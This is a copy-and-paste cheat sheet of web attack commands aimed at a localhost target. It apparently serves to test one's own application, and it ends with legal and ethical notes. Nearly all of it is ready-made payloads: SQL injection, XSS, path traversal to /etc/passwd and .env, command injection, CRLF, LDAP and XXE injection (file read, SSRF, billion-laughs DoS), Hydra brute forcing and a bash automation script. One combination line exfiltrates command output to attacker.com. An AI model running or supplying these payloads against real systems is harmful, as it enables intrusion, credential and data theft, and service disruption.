# Quick Attack Commands Reference
## Copy & Paste Ready Commands for Testing

**Target:** http://localhost:8080

---

## 1. SQL INJECTION

```bash
# Basic SQLi test
curl "http://localhost:8080/api/users?id=1' OR '1'='1"

# UNION-based SQLi
curl "http://localhost:8080/users?id=1' UNION SELECT NULL,NULL,NULL--"

# Time-based blind SQLi
curl "http://localhost:8080/users?id=1' AND SLEEP(5)--"

# Using SQLmap tool
sqlmap -u "http://localhost:8080/users?id=1" --dbs --dump
```

---

## 2. CROSS-SITE SCRIPTING (XSS)

```bash
# Basic XSS
curl "http://localhost:8080/search?q=<script>alert('XSS')</script>"

# Image XSS
curl "http://localhost:8080/search?q=<img src=x onerror='alert(1)'>"

# SVG XSS
curl "http://localhost:8080/search?q=<svg onload='alert(1)'>"

# Event handler XSS
curl "http://localhost:8080/search?q=<body onload='alert(1)'>"

# JavaScript URL
curl "http://localhost:8080/redirect?url=javascript:alert(1)"
```

---

## 3. PATH TRAVERSAL

```bash
# Linux/Unix file access
curl "http://localhost:8080/files/../../../../etc/passwd"
curl "http://localhost:8080/download?file=../../config/secret.txt"

# Windows file access
curl "http://localhost:8080/files/..\\..\\windows\\system32\\drivers\\etc\\hosts"
curl "http://localhost:8080/files/..\\..\\config.ini"

# Access application files
curl "http://localhost:8080/files/../../../../app.py"
curl "http://localhost:8080/files/../../.env"
```

---

## 4. COMMAND INJECTION

```bash
# Simple command injection
curl "http://localhost:8080/ping?host=localhost;whoami"

# Pipe to another command
curl "http://localhost:8080/ping?host=localhost|id"

# Backtick execution
curl "http://localhost:8080/ping?host=localhost\`uname -a\`"

# Dollar sign execution
curl "http://localhost:8080/ping?host=localhost\$(whoami)"

# Command substitution
curl "http://localhost:8080/cmd?input=test;cat /etc/passwd;echo"

# Windows command injection
curl "http://localhost:8080/cmd?input=test&dir"
```

---

## 5. HTTP HEADER INJECTION

```bash
# Malicious X-Forwarded-For header
curl -H "X-Forwarded-For: 127.0.0.1; DROP TABLE users" \
  http://localhost:8080

# Malicious User-Agent
curl -H "User-Agent: <?php system('whoami'); ?>" \
  http://localhost:8080

# Authorization header bypass
curl -H "Authorization: Bearer invalid_token" \
  http://localhost:8080/admin

# CRLF Injection (newline injection)
curl "http://localhost:8080/?header=value%0d%0aSet-Cookie:admin=true"

# Multiple headers
curl -H "X-Custom: value1" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Authorization: Bearer test" \
  http://localhost:8080
```

---

## 6. LDAP INJECTION

```bash
# Basic LDAP filter injection
curl "http://localhost:8080/login?user=*)(uid=*&pass=test"

# Authentication bypass
curl "http://localhost:8080/search?name=admin*)(|(cn=*&password=test"

# Wildcard LDAP injection
curl "http://localhost:8080/ldap?filter=*)(&(uid=*"

# With POST request
curl -X POST \
  -d "user=*)(uid=*&pass=test" \
  http://localhost:8080/login
```

---

## 7. XXE (XML EXTERNAL ENTITY) INJECTION

```bash
# XXE - Read local file
curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>' \
  http://localhost:8080/api/xml

# XXE - SSRF Attack
curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<foo>&xxe;</foo>' \
  http://localhost:8080/process

# XXE - Denial of Service (Billion Laughs)
curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>' \
  http://localhost:8080/process
```

---

## 8. HTTP BASIC AUTH BRUTE FORCE

```bash
# Single credential test
curl -u admin:admin http://localhost:8080/admin
curl -u admin:password http://localhost:8080/admin

# Check response code
curl -o /dev/null -s -w "%{http_code}" -u admin:admin http://localhost:8080/admin

# Loop through passwords
for pass in admin password 123456 letmein; do
  echo "Testing admin:$pass"
  curl -s -u "admin:$pass" http://localhost:8080 | head -20
done

# Using Hydra
hydra -l admin -P wordlist.txt -f http://localhost:8080 http-get
hydra -l admin -P wordlist.txt http://localhost:8080 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

---

## COMBINATION ATTACKS

```bash
# SQL Injection + XSS
curl "http://localhost:8080/users?id=1' UNION SELECT '<script>alert(1)</script>',NULL,NULL--"

# Command Injection + Exfiltration
curl "http://localhost:8080/ping?host=localhost;curl attacker.com/log?data=\$(whoami)"

# Path Traversal + Command Injection
curl "http://localhost:8080/execute?script=../../../../tmp/evil.sh;whoami"
```

---

## TESTING RESPONSE CODES

```bash
# 200 = OK / Success
curl -w "\n%{http_code}\n" http://localhost:8080/

# 401 = Unauthorized (wrong credentials)
curl -w "\n%{http_code}\n" -u wrong:creds http://localhost:8080/admin

# 403 = Forbidden (access denied)
curl -w "\n%{http_code}\n" http://localhost:8080/admin

# 404 = Not Found
curl -w "\n%{http_code}\n" http://localhost:8080/nonexistent

# 500 = Internal Server Error (crash/exception)
curl -w "\n%{http_code}\n" "http://localhost:8080/api?param=<script>"

# 503 = Service Unavailable (DoS success)
curl -w "\n%{http_code}\n" http://localhost:8080/
```

---

## VERBOSE OUTPUT (See Request & Response Headers)

```bash
# Show all headers and response
curl -v "http://localhost:8080"

# Show only headers
curl -i "http://localhost:8080"

# Save request & response to file
curl -v "http://localhost:8080" > output.txt 2>&1

# Custom output format
curl -w "HTTP %{http_code} | Time: %{time_total}s\n" http://localhost:8080
```

---

## USEFUL CURL OPTIONS

```bash
# Set custom header
curl -H "X-Custom-Header: value" http://localhost:8080

# POST with data
curl -X POST -d "param=value" http://localhost:8080

# JSON POST
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}' \
  http://localhost:8080

# Follow redirects
curl -L http://localhost:8080

# Set timeout (seconds)
curl --max-time 10 http://localhost:8080

# Disable SSL verification (for self-signed certs)
curl -k https://localhost:8443

# Save cookies
curl -c cookies.txt http://localhost:8080

# Use saved cookies
curl -b cookies.txt http://localhost:8080

# Basic auth
curl -u username:password http://localhost:8080

# Verbose output
curl -v http://localhost:8080

# Insecure (ignore SSL errors)
curl -k http://localhost:8080
```

---

## ONE-LINER TESTS

```bash
# Check if service is running
curl -s http://localhost:8080 && echo "✓ Service is UP" || echo "✗ Service is DOWN"

# Quick SQL injection test
curl "http://localhost:8080/api?id=1' OR '1'='1" | grep -i error

# Quick XSS test
curl "http://localhost:8080/search?q=<h1>Test</h1>" | grep -i "<h1>Test"

# Check response time
time curl -s http://localhost:8080 > /dev/null

# Get server info
curl -i http://localhost:8080 | grep -i "server:"

# Test all common paths for directory listing
for path in /admin /api /config /uploads /files; do
  curl -s -o /dev/null -w "$path: %{http_code}\n" http://localhost:8080$path
done
```

---

## AUTOMATION SCRIPT (Bash)

```bash
#!/bin/bash
# Automated web app tester

TARGET="http://localhost:8080"
RESULTS="attack_results.txt"

echo "Starting security assessment of $TARGET" > $RESULTS
echo "Timestamp: $(date)" >> $RESULTS
echo "" >> $RESULTS

# Test 1: SQL Injection
echo "[*] Testing SQL Injection..." >> $RESULTS
curl -s "$TARGET/users?id=1' OR '1'='1" >> $RESULTS

# Test 2: XSS
echo "[*] Testing XSS..." >> $RESULTS
curl -s "$TARGET/search?q=<script>test</script>" >> $RESULTS

# Test 3: Command Injection
echo "[*] Testing Command Injection..." >> $RESULTS
curl -s "$TARGET/ping?host=localhost;id" >> $RESULTS

# Test 4: Path Traversal
echo "[*] Testing Path Traversal..." >> $RESULTS
curl -s "$TARGET/files/../../../../etc/passwd" >> $RESULTS

echo "Assessment complete. Results saved to $RESULTS"
```

---

## IMPORTANT NOTES

✅ **LEGAL**: Only test systems you own or have written permission to test
✅ **ETHICAL**: Document all findings and report them responsibly
✅ **SAFE**: Use a test environment, not production
✅ **BACKUP**: Always backup data before testing

⚠️ **DO NOT**: Run these against systems without permission - it's illegal!
